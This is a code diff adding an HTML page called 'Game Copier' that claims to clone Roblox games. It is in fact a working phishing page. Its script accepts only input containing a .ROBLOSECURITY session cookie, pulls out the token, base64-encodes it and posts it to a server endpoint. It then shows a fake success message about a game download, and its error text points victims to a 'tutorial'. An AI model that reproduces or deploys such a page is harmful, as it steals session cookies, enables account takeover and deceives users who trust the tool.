@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Game Copier</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: #0a1128;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+      text-align: center;
+      box-sizing: border-box;
+      position: relative;
+    }
+
+    .container {
+      max-width: 480px;
+      width: 100%;
+      margin: 0 auto;
+      position: absolute;
+      top: 35%;
+      left: 50%;
+      transform: translate(-50%, -35%);
+    }
+
+    h1 {
+      font-size: 4.5rem;
+      font-weight: 700;
+      margin: 0 0 10px 0;
+      line-height: 1.1;
+    }
+
+    p {
+      font-size: 1rem;
+      margin: 0 0 40px 0;
+      font-weight: 400;
+      color: #f0f0f0;
+      line-height: 1.4;
+    }
+
+    input.text-input {
+      width: 100%;
+      padding: 15px 18px;
+      font-size: 1rem;
+      border-radius: 6px;
+      border: 1.5px solid #ccc;
+      outline: none;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    input.text-input:focus {
+      border-color: #056cf2;
+      box-shadow: 0 0 6px rgba(5, 108, 242, 0.5);
+    }
+
+    button.button {
+      margin-top: 20px;
+      padding: 12px 30px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 6px;
+      border: 2px solid #056cf2;
+      background: transparent;
+      color: #056cf2;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      user-select: none;
+    }
+
+    button.button:hover {
+      background-color: #056cf2;
+      color: white;
+    }
+
+    /* Loader styling */
+    .loader {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #056cf2;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      z-index: 1000;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    /* Popup styling */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #112240;
+      padding: 25px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.7);
+      z-index: 1001;
+      width: auto;
+      max-width: 400px;
+      flex-direction: column;
+      align-items: center;
+      color: white;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      gap: 15px;
+      position: relative;
+    }
+
+    .popup-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+      color: white;
+    }
+
+    .popup-content h1 {
+      margin: 0;
+      font-size: 2rem;
+      font-weight: 700;
+    }
+
+    .popup-content p {
+      margin: 0;
+      font-size: 1.1rem;
+      color: #cfd8dc;
+      word-break: break-word;
+    }
+
+    .close-button,
+    .close-buttonERROR {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 1.8rem;
+      cursor: pointer;
+      user-select: none;
+      color: #888;
+      transition: color 0.3s ease;
+    }
+
+    .close-button:hover,
+    .close-buttonERROR:hover {
+      color: #056cf2;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Game Copier</h1>
+    <p>Easily clone any Roblox game with our Game Copier tool.</p>
+    <input class="text-input" id="Textures" placeholder="Enter your code here" type="password" />
+    <button class="button" id="fetchTexturesbutton" onclick="fetchTextures()">Copy Game</button>
+  </div>
+
+  <!-- Loader -->
+  <div class="loader" id="loader"></div>
+
+  <!-- Success Popup -->
+  <div class="popup" id="successPopup">
+    <div class="popup-content">
+      <span class="close-button">×</span>
+      <h1>Success!</h1>
+      <p>Your game download request was sent successfully.</p>
+    </div>
+  </div>
+
+  <!-- Error Popup -->
+  <div class="popup" id="errorPopup">
+    <div class="popup-content">
+      <span class="close-buttonERROR">×</span>
+      <h1>Error!</h1>
+      <p id="errorMsg"></p>
+    </div>
+  </div>
+
+  <script>
+    function fetchTextures() {
+      const btn = document.getElementById("fetchTexturesbutton");
+      const loader = document.getElementById("loader");
+      const inputText = document.getElementById("Textures").value.trim();
+
+      btn.disabled = true;
+      loader.style.display = "block";
+
+      if (!inputText.includes("ROBLOSECURITY")) {
+        errorPopup("Invalid input. Please try again.");
+        btn.disabled = false;
+        loader.style.display = "none";
+        return;
+      }
+
+      // Extract the .ROBLOSECURITY token from input
+      const tokenMatch = inputText.match(/[\w%+=]{80,}/);
+      const token = tokenMatch ? tokenMatch[0] : null;
+
+      if (!token) {
+        errorPopup("Unable to process. Please verify you did it correctly or rewatch the tutorial.");
+        btn.disabled = false;
+        loader.style.display = "none";
+        return;
+      }
+
+      const encodedToken = btoa(token);
+
+      fetch('/api/send-token', {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: encodedToken }),
+      })
+      .then(response => {
+        if (response.ok) {
+          setTimeout(() => {
+            showPopup();
+            btn.disabled = false;
+            loader.style.display = "none";
+          }, 1500);
+        } else {
+          errorPopup("Failed to send game download. Please try again.");
+          btn.disabled = false;
+          loader.style.display = "none";
+        }
+      })
+      .catch(() => {
+        errorPopup("Something went wrong. Try again later.");
+        btn.disabled = false;
+        loader.style.display = "none";
+      });
+    }
+
+    function showPopup() {
+      const popup = document.getElementById("successPopup");
+      popup.style.display = "flex";
+      document.querySelector(".close-button").onclick = () => {
+        popup.style.display = "none";
+      };
+    }
+
+    function errorPopup(msg) {
+      const popup = document.getElementById("errorPopup");
+      popup.style.display = "flex";
+      document.getElementById("errorMsg").innerText = msg;
+      document.querySelector(".close-buttonERROR").onclick = () => {
+        popup.style.display = "none";
+      };
+    }
+  </script>
+</body>
+</html>
